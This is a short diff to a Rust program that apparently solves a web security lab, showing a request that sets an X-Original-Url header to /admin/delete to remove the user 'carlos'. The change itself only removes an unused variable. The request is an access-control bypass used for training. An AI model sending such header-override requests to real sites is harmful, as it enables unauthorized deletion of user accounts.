@@ -54,7 +54,7 @@ fn main() {
     io::stdout().flush();
 
     // delete carlos
-    let delete_carlos = client
+    client
         .get(format!("{url}?username=carlos"))
         .header("X-Original-Url", "/admin/delete")
         .send()
